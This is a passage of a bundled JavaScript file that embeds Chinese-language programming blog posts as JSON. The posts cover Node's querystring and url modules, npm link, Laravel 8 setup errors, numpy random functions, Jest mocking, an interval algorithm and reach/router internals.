id=\\"querystring\\">querystring</h3>\\n<ul>\\n<li>querystring.stringify</li>\\n</ul>\\n<p>参数一：转换对象</p>\\n<p><code>querystring.stringify({x:1,y:2,c:[3,4]})</code></p>\\n<p>输出：</p>\\n<p><code>x=1&amp;y=2&amp;c=3&amp;c=4</code></p>\\n<p>参数二：输出连接符</p>\\n<p><code>querystring.stringify({x:1,y:2,c:[3,4]},&quot;,&quot;)</code></p>\\n<p>输出：</p>\\n<p><code>x=1,y=2,c=3,c=4</code></p>\\n<p>参数三：key,value连接符</p>\\n<p><code>querystring.stringify({x:1,y:2,c:[3,4]},&quot;,&quot;,&quot;:&quot;)</code></p>\\n<p>输出：</p>\\n<p><code>x:1,y:2,c:3,c:4</code></p>\\n<ul>\\n<li>querystring.parse</li>\\n</ul>\\n<p>参数一，转换对象</p>\\n<p><code>querystring.parse(&quot;x:1,y:2,c:3,c:4&quot;)</code></p>\\n<p>输出：</p>\\n<p><code>{ &#39;x:1,y:2,c:3,c:4&#39;: &#39;&#39; }</code>解析错误，补充参数</p>\\n<p>参数二，连接符</p>\\n<p><code>querystring.parse(&quot;x:1,y:2,c:3,c:4&quot;,&#39;,&#39;)</code></p>\\n<p>输出：</p>\\n<p><code>{ &#39;x:1&#39;: &#39;&#39;, &#39;y:2&#39;: &#39;&#39;, &#39;c:3&#39;: &#39;&#39;, &#39;c:4&#39;: &#39;&#39; }</code>解析错误，补充参数</p>\\n<p>参数三，key,value连接符</p>\\n<p><code>querystring.parse(&quot;x:1,y:2,c:3,c:4&quot;,&#39;,&#39;,&#39;:&#39;)</code></p>\\n<p>输出：</p>\\n<p><code>{ x: &#39;1&#39;, y: &#39;2&#39;, c: [ &#39;3&#39;, &#39;4&#39; ] }</code>解析正确</p>\\n<p>参数四，可接受字符串的最大长度，默认为1000 </p>\\n<p>?? 不常用</p>\\n<ul>\\n<li>querystring.escape</li>\\n</ul>\\n<p>转义，<code>window.encodeURIComponent</code></p>\\n<p><code>querystring.escape(&#39;&lt;你好&gt;&#39;)</code></p>\\n<p>输出：</p>\\n<p><code>%3C%E4%BD%A0%E5%A5%BD%3E</code></p>\\n<ul>\\n<li>querystring.unescape</li>\\n</ul>\\n<p>反转义，<code>window.decodeURIComponent</code></p>\\n<p><code>querystring.unescape(&#39;%3C%E4%BD%A0%E5%A5%BD%3E&#39;)</code></p>\\n<p>输出：</p>\\n<p><code>&lt;你好&gt;</code></p>\\n<hr>\\n<h3 id=\\"urlparse\\">url.parse</h3>\\n<p>第一个参数：url地址\\n<code>url.parse(&#39;http://www.somesite.com:8080/video?x=1&amp;y=2&#39;)</code></p>\\n<p>输出：</p>\\n<pre><code><pre class=\\"hljs\\"><code>Url {\\n  protocol: \'http:\',\\n  slashes: true,\\n  auth: null,\\n  host: \'www.somesite.com:8080\',\\n  port: \'8080\',\\n  hostname: \'www.somesite.com\',\\n  hash: null,\\n  search: \'?x=1&amp;y=2\',\\n  query: \'x=1&amp;y=2\',\\n  pathname: \'/video\',\\n  path: \'/video?x=1&amp;y=2\',\\n  href: \'http://www.somesite.com:8080/video?x=1&amp;y=2\' }</code></pre></code></pre><p>第二个参数：是否解析query</p>\\n<p><code>url.parse(&#39;http://www.somesite.com:8080/video?x=1&amp;y=2&#39;,true)</code></p>\\n<p>输出：</p>\\n<pre><code><pre class=\\"hljs\\"><code>Url {\\n  protocol: \'http:\',\\n  slashes: true,\\n  auth: null,\\n  host: \'www.somesite.com:8080\',\\n  port: \'8080\',\\n  hostname: \'www.somesite.com\',\\n  hash: null,\\n  search: \'?x=1&amp;y=2\',\\n  query: { x: \'1\', y: \'2\' },\\n  pathname: \'/video\',\\n  path: \'/video?x=1&amp;y=2\',\\n  href: \'http://www.somesite.com:8080/video?x=1&amp;y=2\' }</code></pre></code></pre><p>第三个参数：是否可以省略protocol</p>\\n<p><code>url.parse(&#39;//www.somesite.com:8080/video?x=1&amp;y=2&#39;,true,true)</code></p>\\n<p>输出：</p>\\n<pre><code><pre class=\\"hljs\\"><code>Url {\\n  protocol: null,\\n  slashes: true,\\n  auth: null,\\n  host: \'www.somesite.com:8080\',\\n  port: \'8080\',\\n  hostname: \'www.somesite.com\',\\n  hash: null,\\n  search: \'?x=1&amp;y=2\',\\n  query: { x: \'1\', y: \'2\' },\\n  pathname: \'/video\',\\n  path: \'/video?x=1&amp;y=2\',\\n  href: \'//www.somesite.com:8080/video?x=1&amp;y=2\' }</code></pre></code></pre><h3 id=\\"urlresolve\\">url.resolve</h3>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">const</span> url = <span class=\\"hljs-built_in\\">require</span>(<span class=\\"hljs-string\\">\'url\'</span>);\\nurl.resolve(<span class=\\"hljs-string\\">\'/one/two/three\'</span>, <span class=\\"hljs-string\\">\'four\'</span>);         <span class=\\"hljs-comment\\">// \'/one/two/four\'</span>\\nurl.resolve(<span class=\\"hljs-string\\">\'http://example.com/\'</span>, <span class=\\"hljs-string\\">\'/one\'</span>);    <span class=\\"hljs-comment\\">// \'http://example.com/one\'</span>\\nurl.resolve(<span class=\\"hljs-string\\">\'http://example.com/one\'</span>, <span class=\\"hljs-string\\">\'/two\'</span>); <span class=\\"hljs-comment\\">// \'http://example.com/two\'</span></code></pre></code></pre>\\n","toc":[{"anchor":"querystring","level":3,"text":"querystring"},{"anchor":"urlparse","level":3,"text":"url.parse"},{"anchor":"urlresolve","level":3,"text":"url.resolve"}],"relatedTags":null,"created_at":"2018-12-05","timeArr":[2018,11,5,0,0,0,0],"title":"node-querystring和url笔记","uuid":"87971cd868e8cd749775bd93de4025ef1746d9d7","summary":"<h4>querystring</h4>\\n<ul>\\n<li>querystring.stringify</li>\\n</ul>\\n<p>参数一：转换对象</p>\\n<p><code>querystring.stringify({x:1,y:2,c:[3,4]})</code></p>\\n<p>输出：</p>\\n<p><code>x=1&amp;y=2&amp;c=3&amp;c=4</code></p>\\n<p>参数二：输出连接符</p>\\n<p>`querystring.stringify({x:1,y...</p>","slug":"node-querystring-he-url-bi-ji","sha":"65baf42e906ec1137456584196cc311c143c7570"}')},619:function(n){n.exports=JSON.parse('{"content":"<p>关于<code>npm-link</code>的使用</p>\\n<p>当开发项目时，有时候会想用一个本地的工具，复制源码什么的太麻烦了，发布到npm也很麻烦，就只想直接用。\\n那么可以考虑使用<code>npm-link</code>。</p>\\n<p>现在我有一个工具项目叫做<code>tool</code></p>\\n<p>我可以先注册到全局</p>\\n<p><code>npm link tool</code></p>\\n<p>接着，找到我想导入的项目：<code>cd project</code>，在当前项目目录下：</p>\\n<p><code>npm link tool</code></p>\\n<p>这样，就会将这个<code>tool</code>加载到<code>node_modules</code>里面，直接<code>import</code>或者<code>require</code>就可以使用了。</p>\\n","toc":[],"relatedTags":null,"created_at":"2018-10-12","timeArr":[2018,9,12,0,0,0,0],"title":"npm-link的使用","uuid":"4e6c7ab04e26dcf8fee1500f1d90cb218b836309","summary":"<p>关于<code>npm-link</code>的使用</p>\\n<p>当开发项目时，有时候会想用一个本地的工具，复制源码什么的太麻烦了，发布到npm也很麻烦，就只想直接用。\\n那么可以考虑使用<code>npm-link</code>。</p>\\n<p>现在我有一个工具项目叫做<code>tool</code></p>\\n<p>我可以先注册到全局</p>\\n<p><code>npm link tool</code></p>\\n<p>接着，找到我想导入的项目：`cd proje...</p>","slug":"npm-link-de-shi-yong","sha":"622748c94137c2c180569b7e9ea94fee9140add1"}')},620:function(n){n.exports=JSON.parse('{"content":"<h3 id=\\"wen-ti-1php-extension-sodium\\">问题1(PHP extension sodium)</h3>\\n<blockquote>\\n<p>lcobucci/jwt 4.1.4 requires ext-sodium * -&gt; the requested PHP extension sodium is missing from your system.</p>\\n</blockquote>\\n<p>在<code>php.ini</code>内部取消<code>extension=sodium</code>这一句的注释即可</p>\\n<h3 id=\\"wen-ti-2valid-cache-path\\">问题2(valid cache path)</h3>\\n<blockquote>\\n<p>InvalidArgumentException</p>\\n<p>Please provide a valid cache path.</p>\\n</blockquote>\\n<p>在<code>storage/framework</code>文件夹下面创建</p>\\n<p><code>sessions</code></p>\\n<p><code>views</code></p>\\n<p><code>cache</code></p>\\n<h3 id=\\"wen-ti-3descriptiondatamatcherruleplugin\\">问题3(DescriptionDataMatcherRulePlugin)</h3>\\n<blockquote>\\n<p> Cannot find module &#39;webpack/lib/rules/DescriptionDataMatcherRulePlugin&#39;</p>\\n</blockquote>\\n<p>安装最新的<code>vue-loader</code>（文中最新版本 v15.9.8）</p>\\n<h3 id=\\"wen-ti-4-nei-cun-bu-zu\\">问题4(内存不足)</h3>\\n<blockquote>\\n<p>FATAL ERROR: CALL_AND_RETRY_LAST Allocation failed - JavaScript heap out of memory</p>\\n</blockquote>\\n<p>通过更新最新版本<code>node</code>解决，也可以通过命令行<code>node --max-old-space-size=4096</code></p>\\n<p>后面的数字<code>4096</code>(MB)代表定义分配的内存</p>\\n<h3 id=\\"wen-ti-5git-pull-shi-bai\\">问题5(git pull失败)</h3>\\n<blockquote>\\n<p>fatal: refusing to merge unrelated histories</p>\\n</blockquote>\\n<p>当进行<code>pull</code>时，出现远程git历史和本地git历史对应不上的问题，<code>git pull --allow-unrelated-histories</code></p>\\n<h3 id=\\"wen-ti-6node-sass-gou-jian-shi-bai\\">问题6(node-sass构建失败)</h3>\\n<blockquote>\\n<p>Node Sass could not find a binding for your current environment: Windows 64-bit with Node.js 14.x</p>\\n</blockquote>\\n<p>原因是更新了<code>nodejs</code>，在文件夹内输入<code>npm rebuild node-sass</code></p>\\n","toc":[{"anchor":"wen-ti-1php-extension-sodium","level":3,"text":"问题1(PHP extension sodium)"},{"anchor":"wen-ti-2valid-cache-path","level":3,"text":"问题2(valid cache path)"},{"anchor":"wen-ti-3descriptiondatamatcherruleplugin","level":3,"text":"问题3(DescriptionDataMatcherRulePlugin)"},{"anchor":"wen-ti-4-nei-cun-bu-zu","level":3,"text":"问题4(内存不足)"},{"anchor":"wen-ti-5git-pull-shi-bai","level":3,"text":"问题5(git pull失败)"},{"anchor":"wen-ti-6node-sass-gou-jian-shi-bai","level":3,"text":"问题6(node-sass构建失败)"}],"relatedTags":null,"created_at":"2021-08-09","timeArr":[2021,7,9,0,0,0,0],"title":"配置Larvael8问题记录","uuid":"e0183343ceb8acf22211aa4b6df0a043841fcdbe","summary":"<p>lcobucci/jwt 4.1.4 requires ext-sodium * -&gt; the requested PHP extension sodium is missing from your system.</p>","slug":"pei-zhi-Larvael8-wen-ti-ji-lu","sha":"3d70142487c738aca907d343c25036cd28a2978c"}')},621:function(n){n.exports=JSON.parse('{"content":"<p>原文链接：<a href=\\"https://blog.csdn.net/ImwaterP/article/details/96282230\\">https://blog.csdn.net/ImwaterP/article/details/96282230</a></p>\\n<p> 处理数据时经常需要从数组中随机抽取元素，这时候就需要用到np.random.choice()。然而choice用法的官方解释并不详细，尤其是对replace参数的解释，例子也不是很全面。因此经过反复实验，我较为详细的总结出了他的用法，并给出了较为详细的使用代码例子。</p>\\n<p><strong>官方解释</strong>：<a href=\\"https://docs.scipy.org/doc/numpy/reference/generated/numpy.random.choice.html\\">https://docs.scipy.org/doc/numpy/reference/generated/numpy.random.choice.html</a></p>\\n<p><strong>下面是我自己的总结</strong></p>\\n<pre><code><pre class=\\"hljs\\"><code>#numpy.random.choice(a, size=None, replace=True, p=None)\\n#从a(只要是ndarray都可以，但必须是一维的)中随机抽取数字，并组成指定大小(size)的数组\\n#replace:True表示可以取相同数字，False表示不可以取相同数字\\n#数组p：与数组a相对应，表示取数组a中每个元素的概率，默认为选取每个元素的概率相同。</code></pre></code></pre><p>除了numpy中的数组，python内建的list（列表）、tuple（元组）也可以使用。</p>\\n<pre><code><pre class=\\"hljs\\"><code>&gt;&gt;&gt;np.random.choice(5)#从[0, 5)中随机输出一个随机数\\n#相当于np.random.randint(0, 5)\\n    2\\n\\n&gt;&gt;&gt;np.random.choice(5, 3)#在[0, 5)内输出五个数字并组成一维数组（ndarray）\\n#相当于np.random.randint(0, 5, 3)\\n    array([1, 4, 1])</code></pre></code></pre><pre><code><pre class=\\"hljs\\"><code>L = [1, 2, 3, 4, 5]#list列表\\nT = (2, 4, 6, 2)#tuple元组\\nA = np.array([4, 2, 1])#numpy,array数组,必须是一维的\\nA0 = np.arange(10).reshape(2, 5)#二维数组会报错\\n\\n&gt;&gt;&gt;np.random.choice(L, 5)\\n    array([3, 5, 2, 1, 5])\\n\\n&gt;&gt;&gt;np.random.choice(T, 5)\\n    array([2, 2, 2, 4, 2])\\n\\n&gt;&gt;&gt;np.random.choice(A, 5)\\n    array([1, 4, 2, 2, 1])\\n\\n&gt;&gt;&gt;np.random.choice(A0, 5)#如果是二维数组，会报错\\n    ValueError: \'a\' must be 1-dimensional</code></pre></code></pre><ul>\\n<li><strong>参数replace</strong> 用来设置是否可以取相同元素： True表示可以取相同数字； False表示不可以取相同数字。 默认是True</li>\\n</ul>\\n<pre><code><pre class=\\"hljs\\"><code>np.random.choice(5, 6, replace=True)#可以看到有相同元素\\n    array([3, 4, 1, 1, 0, 3])\\nnp.random.choice(5, 6, replace=False)#会报错，因为五个数字中取六个，不可能不取到重复的数字\\n    ValueError: Cannot take a larger sample than population when \'replace=False\'</code></pre></code></pre><ul>\\n<li><strong>参数p</strong></li>\\n</ul>\\n<p>p实际是个数组，大小（size）应该与指定的a相同，用来规定选取a中每个元素的概率，默认为概率相同，总和为1</p>\\n<pre><code><pre class=\\"hljs\\"><code>&gt;&gt;&gt; aa_milne_arr = [\'pooh\', \'rabbit\', \'piglet\', \'Christopher\']\\n&gt;&gt;&gt; np.random.choice(aa_milne_arr, 5, p=[0.5, 0.1, 0.1, 0.3])\\n    array([\'pooh\', \'pooh\', \'pooh\', \'Christopher\', \'piglet\'], dtype=\'|S11\')\\n#可以看到，‘pooh’被选取的概率明显比其他几个高很多</code></pre></code></pre>","toc":[],"relatedTags":null,"created_at":"2021-06-23","timeArr":[2021,5,23,0,0,0,0],"title":"python中np.random.choice用法","uuid":"b4315c63d7a7179f31a5a4701339c88c9db60367","summary":"<p>原文链接：https://blog.csdn.net/ImwaterP/article/details/96282230</p>\\n<p>处理数据时经常需要从数组中随机抽取元素，这时候就需要用到np.random.choice()。然而choice用法的官方解释并不详细，尤其是对replace参数的解释，例子也不是很全面。因此经...</p>","slug":"python-zhong-np.random.choice-yong-fa","sha":"70e068f0c4b30d8c9c32f4cb05469a984c554dd8"}')},622:function(n){n.exports=JSON.parse('{"content":"<p><code>np.random.randint</code>函数的作用是，返回一个随机整型数，范围从低（包括）到高（不包括），即[low, high)。\\n如果没有写参数high的值，则返回[0,low)的值。</p>\\n<p>参数如下：</p>\\n<ul>\\n<li><p>low: int<br>生成的数值最低要大于等于low。<br>（hign = None时，生成的数值要在[0, low)区间内）</p>\\n</li>\\n<li><p>high: int (可选)<br>如果使用这个值，则生成的数值在[low, high)区间。<br>size: int or tuple of ints(可选)<br>输出随机数的尺寸，比如size = (m * n* k)则输出同规模即m * n* k个随机数。默认是None的，仅仅返回满足要求的单一随机数。  </p>\\n</li>\\n<li><p>dtype: dtype(可选)：<br>想要输出的格式。如int64、int等等</p>\\n</li>\\n</ul>\\n<p>例子:</p>\\n<pre><code class=\\"language-py\\"><pre class=\\"hljs\\"><code>np.random.randint(<span class=\\"hljs-number\\">2</span>,size=<span class=\\"hljs-number\\">5</span>)\\n<span class=\\"hljs-comment\\"># [0,1,1,0,0]</span>\\nnp.random.randint(<span class=\\"hljs-number\\">2</span>,<span class=\\"hljs-number\\">5</span>,<span class=\\"hljs-number\\">10</span>)\\n<span class=\\"hljs-comment\\"># [2 3 2 3 4 2 3 4 2 4]</span>\\nnp.random.randint(<span class=\\"hljs-number\\">0</span>,<span class=\\"hljs-number\\">2</span>,(<span class=\\"hljs-number\\">1</span>,<span class=\\"hljs-number\\">10</span>))\\n<span class=\\"hljs-comment\\"># [[0 0 1 1 0 1 0 0 0 0]]</span>\\nnp.random.randint(<span class=\\"hljs-number\\">2</span>,size=(<span class=\\"hljs-number\\">1</span>,<span class=\\"hljs-number\\">10</span>))\\n<span class=\\"hljs-comment\\"># 和上一个意思一样</span></code></pre></code></pre>\\n<p><code>np.random.rand</code>函数则是生成<code>N</code>维(根据参数数量)数组，但是每一个随机值都是<code>0-1</code>之间</p>\\n<p>例如：</p>\\n<pre><code class=\\"language-py\\"><pre class=\\"hljs\\"><code>np.random.rand(<span class=\\"hljs-number\\">2</span>)\\n<span class=\\"hljs-comment\\"># 生成一维数组</span>\\n<span class=\\"hljs-comment\\"># [0.40358037 0.06688054]</span>\\nnp.random.rand(<span class=\\"hljs-number\\">2</span>,<span class=\\"hljs-number\\">1</span>)\\n<span class=\\"hljs-comment\\"># 生成二维数组</span>\\n<span class=\\"hljs-comment\\"># [[0.90992383]</span>\\n   [<span class=\\"hljs-number\\">0.51200082</span>]]</code></pre></code></pre>\\n","toc":[],"relatedTags":null,"created_at":"2021-06-23","timeArr":[2021,5,23,0,0,0,0],"title":"python中np.random.randint和np.random.rand","uuid":"69da2e3ca5800f073b160c6e0c7a8d842ca7209a","summary":"<p><code>np.random.randint</code>函数的作用是，返回一个随机整型数，范围从低（包括）到高（不包括），即[low, high)。\\n如果没有写参数high的值，则返回[0,low)的值。</p>\\n<p>参数如下：</p>\\n<ul>\\n<li>low: int<br>\\n生成的数值最低要大于等于low。<br>\\n（hign = None时，生成的数值要在[...</li>\\n</ul>","slug":"python-zhong-np.random.randint-he-np.random.rand","sha":"e3f445d6ec3ac5ef8575d52929213c9491266c5d"}')},623:function(n){n.exports=JSON.parse('{"content":"<p>内容包括：<code>tag 模板字符串</code>，<code>Labelled statements</code>，<code>React服务端渲染使用stream</code>，<code>jest.fn</code>，<code>jest.mock</code></p>\\n<h3 id=\\"tag--mu-ban-zi-fu-chuan\\">tag 模板字符串</h3>\\n<p>以<code>${xx}</code>分割字符串，分别传入2个数组，第一个是<code>分割后的结果</code>，第二个是<code>分割的变量</code></p>\\n<p>例如：</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">// Defining a Tag for template literals</span>\\n<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">highlight</span>(<span class=\\"hljs-params\\">strings, ...values</span>) </span>{\\n  <span class=\\"hljs-comment\\">// here i is the iterator for the strings array</span>\\n  <span class=\\"hljs-keyword\\">let</span> result = <span class=\\"hljs-string\\">\'\'</span>\\n  strings.forEach(<span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">str, i</span>) =&gt;</span> {\\n    result += str\\n    <span class=\\"hljs-keyword\\">if</span> (values[i]) {\\n      result += <span class=\\"hljs-string\\">`&lt;mark&gt;<span class=\\"hljs-subst\\">${values[i]}</span>&lt;/mark&gt;`</span>\\n    }\\n  })\\n  <span class=\\"hljs-keyword\\">return</span> result\\n}\\n\\n<span class=\\"hljs-keyword\\">const</span> author = <span class=\\"hljs-string\\">\'Henry Avery\'</span>\\n<span class=\\"hljs-keyword\\">const</span> statement = <span class=\\"hljs-string\\">`I am a man of fortune &amp; I must seek my fortune`</span>\\n<span class=\\"hljs-keyword\\">const</span> quote = highlight<span class=\\"hljs-string\\">`<span class=\\"hljs-subst\\">${author}</span> once said, <span class=\\"hljs-subst\\">${statement}</span>`</span>\\n\\n<span class=\\"hljs-comment\\">// &lt;mark&gt;Henry Avery&lt;/mark&gt; once said, &lt;mark&gt;I am a man of fortune</span>\\n<span class=\\"hljs-comment\\">// &amp; I must seek my fortune&lt;/mark&gt;</span></code></pre></code></pre>\\n<hr>\\n<h3 id=\\"labelled-statements\\">Labelled statements</h3>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code>declarationBlock: {\\n  <span class=\\"hljs-comment\\">// can be used to group logical code blocks together</span>\\n  <span class=\\"hljs-keyword\\">var</span> i, j\\n}\\n\\n\\n<span class=\\"hljs-attr\\">forLoop1</span>: <span class=\\"hljs-comment\\">//The first for statement is labeled \\"forLoop1\\"</span>\\n<span class=\\"hljs-keyword\\">for</span> (i = <span class=\\"hljs-number\\">0</span>; i &lt; <span class=\\"hljs-number\\">3</span>; i++) {      \\n   <span class=\\"hljs-attr\\">forLoop2</span>: <span class=\\"hljs-comment\\">//The second for statement is labeled \\"forLoop2\\"</span>\\n   <span class=\\"hljs-keyword\\">for</span> (j = <span class=\\"hljs-number\\">0</span>; j &lt; <span class=\\"hljs-number\\">3</span>; j++) {   \\n      <span class=\\"hljs-keyword\\">if</span> (i === <span class=\\"hljs-number\\">1</span> &amp;&amp; j === <span class=\\"hljs-number\\">1</span>) {\\n         <span class=\\"hljs-keyword\\">continue</span> forLoop1\\n      }\\n      <span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-string\\">\'i = \'</span> + i + <span class=\\"hljs-string\\">\', j = \'</span> + j)\\n   }\\n}\\n\\n<span class=\\"hljs-attr\\">loopBlock4</span>: {\\n  <span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-string\\">\'I will print\'</span>)\\n  <span class=\\"hljs-keyword\\">break</span> loopBlock4\\n  <span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-string\\">\'I will not print\'</span>)\\n}</code></pre></code></pre>\\n<hr>\\n<h3 id=\\"payload--zi-mian-you-xiao-zai-he\\">payload 字面：有效载荷</h3>\\n<p>一般指的是实际的内容，例如json:</p>\\n<pre><code><pre class=\\"hljs\\"><code>js:{\\ndata:123\\n}</code></pre></code></pre><p>这里<code>123</code>就是<code>payload</code></p>\\n<hr>\\n<h3 id=\\"wang-luo-xin-xi-cha-xun\\">网络信息查询</h3>\\n<p>API:<code>navigation.connection</code></p>\\n<hr>\\n<h3 id=\\"react-fu-wu-duan-xuan-ran-shi-yong-stream\\">React服务端渲染使用stream</h3>\\n<pre><code><pre class=\\"hljs\\"><code>const ReactDOMServer require(\'react-dom/server\')\\nconst http = require(\'http\')\\nconst fs = require(\'fs\')\\nconst app = require(\'./app\')\\n\\n// bad\\nconst server = http.createServer((req, res) =&gt; {\\n    const body = ReactDOMServer.renderToString(app)\\n    res.end(body)\\n});\\n\\n// good\\nconst server = http.createServer(function (req, res) {\\n    const stream = ReactDOMServer.renderToNodeStream(app)\\n    stream.pipe(res)\\n})\\n\\nserver.listen(8000)</code></pre></code></pre><hr>\\n<h3 id=\\"jestfn\\">jest.fn</h3>\\n<p>模拟一个函数，参数是<code>(函数的行为)</code></p>\\n<p><code>const mockFn=jest.fn(()=&gt;55)</code></p>\\n<p>可以通过</p>\\n<ul>\\n<li><code>expect(mockFn).toHaveBeenCalled()</code> 验证是否被调用</li>\\n<li><code>expect(mockFn).toHaveBeenCalledTimes(num)</code>验证是否被调用num次</li>\\n<li><code>expect(mockFn).toHaveBeenCalledWith(arg1,arg2)</code>验证是否存在被调用的参数</li>\\n<li><code>expect(mockFn).toHaveBeenLastCalledWith(arg1,arg2)</code>验证最后一次被调用的参数</li>\\n<li><code>expect(mockFn).toHaveBeenNthCalledWith(Nth,arg1,arg2)</code>验证第Nth次被调用的参数</li>\\n<li><code>expect(mockFn).toHaveBeenNthCalledWith(arg1,arg2)</code>验证最后一次被调用的参数</li>\\n<li><code>mockFn.mock.call</code>查看函数被调用的数组</li>\\n</ul>\\n<hr>\\n<h3 id=\\"jestmock\\">jest.mock</h3>\\n<p>模拟一个模块，参数分别是<code>(模块路径,模块的行为,模块是否虚拟的)</code></p>\\n<p>例如：一个项目不存在<code>../abc.js</code>这个模块</p>\\n<pre><code><pre class=\\"hljs\\"><code>jest.mock(\'../abc.js\',() =&gt; {\\n  return jest.fn(() =&gt; 42);\\n},{virtual:true})</code></pre></code></pre><p>第三个参数表示这个模块实际不存在</p>\\n","toc":[{"anchor":"tag--mu-ban-zi-fu-chuan","level":3,"text":"tag 模板字符串"},{"anchor":"labelled-statements","level":3,"text":"Labelled statements"},{"anchor":"payload--zi-mian-you-xiao-zai-he","level":3,"text":"payload 字面：有效载荷"},{"anchor":"wang-luo-xin-xi-cha-xun","level":3,"text":"网络信息查询"},{"anchor":"react-fu-wu-duan-xuan-ran-shi-yong-stream","level":3,"text":"React服务端渲染使用stream"},{"anchor":"jestfn","level":3,"text":"jest.fn"},{"anchor":"jestmock","level":3,"text":"jest.mock"}],"relatedTags":null,"created_at":"2018-12-08","timeArr":[2018,11,8,0,0,0,0],"title":"前端日常笔记","uuid":"34441675832af7bfe9b306f5bd75927d10cb58a0","summary":"<p>内容包括：<code>tag 模板字符串</code>，<code>Labelled statements</code>，<code>React服务端渲染使用stream</code>，<code>jest.fn</code>，<code>jest.mock</code></p>\\n<h4>tag 模板字符串</h4>\\n<p>以<code>${xx}</code>分割字符串，分别传入2个数组，第一个是<code>分割后的结果</code>，第二个是<code>分割的变量</code></p>\\n<p>例如：</p>\\n<pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">// ...</span></code></pre>","slug":"qian-duan-ri-chang-bi-ji","sha":"a599fef4a57cb1e1e640bb153fdedda0e6ad5339"}')},624:function(n){n.exports=JSON.parse('{"content":"<p>给出一系列间隔，例如<code>[[1,2],[3,5],[1,3],[2,3],[2,4]]</code></p>\\n<p>求出最大的不重复间隔数量。</p>\\n<p>例1:</p>\\n<p>input : <code>[[1,2],[3,5],[1,3],[2,3],[2,4]]</code></p>\\n<p>output : 3</p>\\n<p>这种题思路是按间隔的<code>尾部排序</code>。</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">/**\\n * Definition for an interval.\\n * function Interval(start, end) {\\n *     this.start = start;\\n *     this.end = end;\\n * }\\n */</span>\\n<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">getMaxNoOverLapIntervals</span>(<span class=\\"hljs-params\\">itv</span>)</span>{\\n  <span class=\\"hljs-keyword\\">if</span>(itv.length===<span class=\\"hljs-number\\">0</span>)<span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-number\\">0</span>\\n  <span class=\\"hljs-comment\\">// 排序</span>\\n  itv.sort(<span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">a,b</span>)=&gt;</span>a.end-b.end)\\n  <span class=\\"hljs-keyword\\">let</span> count=<span class=\\"hljs-number\\">1</span>\\n  <span class=\\"hljs-keyword\\">let</span> prevE=itv[<span class=\\"hljs-number\\">0</span>].end\\n  <span class=\\"hljs-comment\\">// 逐个检查是否重叠</span>\\n  <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=<span class=\\"hljs-number\\">1</span>;i&lt;itv.length;i++){\\n    <span class=\\"hljs-keyword\\">let</span> curS=itv[i].start,curE=itv[i].end\\n    <span class=\\"hljs-keyword\\">if</span>(curS&lt;prevE)<span class=\\"hljs-keyword\\">continue</span>\\n    prevE=curE\\n    count++\\n  }\\n  <span class=\\"hljs-keyword\\">return</span> count\\n}\\n</code></pre></code></pre>\\n","toc":[],"relatedTags":null,"created_at":"2018-11-08","timeArr":[2018,10,8,0,0,0,0],"title":"求不重叠间隔的算法","uuid":"bebc0fc1532d19e9cec7bedd22a5141f7927276c","summary":"<p>给出一系列间隔，例如<code>[[1,2],[3,5],[1,3],[2,3],[2,4]]</code></p>\\n<p>求出最大的不重复间隔数量。</p>\\n<p>例1:</p>\\n<p>input : <code>[[1,2],[3,5],[1,3],[2,3],[2,4]]</code></p>\\n<p>output : 3</p>\\n<p>这种题思路是按间隔的<code>尾部排序</code>。</p>\\n<pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">/**\\n * Definiti...</span></code></pre>","slug":"qiu-bu-chong-die-jian-ge-de-suan-fa","sha":"88bd0b8b65d66224f77f7c40a5034f06a5ca729a"}')},625:function(n){n.exports=JSON.parse('{"content":"<h2 id=\\"reachrouter\\">reach/router</h2>\\n<p><a href=\\"https://github.com/stonehank/sourcecode-analysis/blob/master/source-code.reach-router/README.md\\">完整源码说明注释</a></p>\\n<p>一张导图：</p>\\n<p><img src=\\"/article/img/reachRouter.png\\" alt=\\"\\"></p>\\n<p>几个亮点：</p>\\n<ul>\\n<li>匹配顺序</li>\\n</ul>\\n<p>源码中是使用了一个评分的方法：</p>\\n<ol>\\n<li>先对路径去除头尾的<code>/</code> ，并且按<code>/</code>分割成路径片段数组</li>\\n<li>对数组使用reduce方法计算分值，如下：<pre><code><pre class=\\"hljs\\"><code>let SEGMENT_POINTS = 4;     // 基本分值，每一个路径片段都有\\nlet STATIC_POINTS = 3;      // 静态路径，如：/abc\\nlet DYNAMIC_POINTS = 2;     // 动态路径，如：/:section\\nlet SPLAT_PENALTY = 1;      // 通配符（减分），如：/*，此处遇到通配符会先减去基本分值，再减1分（优先权很低）\\nlet ROOT_POINTS = 1;        // 根路径</code></pre></code></pre>可知优先权排序为：</li>\\n</ol>\\n<p>静态路径 &gt; 动态路径 &gt; 根路径 &gt; 通配符</p>\\n<ul>\\n<li>相对路径</li>\\n</ul>\\n<p>涉及到3个方法：</p>\\n<p><code>./index.js--&gt;createRoute</code></p>\\n<p><code>./lib/utils.js--&gt;resolve</code></p>\\n<p><code>./lib/util.js--&gt;pick</code></p>\\n<p>首先是通过<code>basepath</code>(一个Router自定义属性，用作路径的公共前缀)结合每一个children(即Route Component)的path通过<code>createRoute</code>方法计算出一个绝对路径</p>\\n<p>再通过<code>pick</code>方法与当前<code>pathname</code>(即window.location.pathname)进行匹配，计算得出一个非通配(<em>)路径匹配值(baseuri)，`例如：&#39;a/</em>&#39; --&gt;匹配出 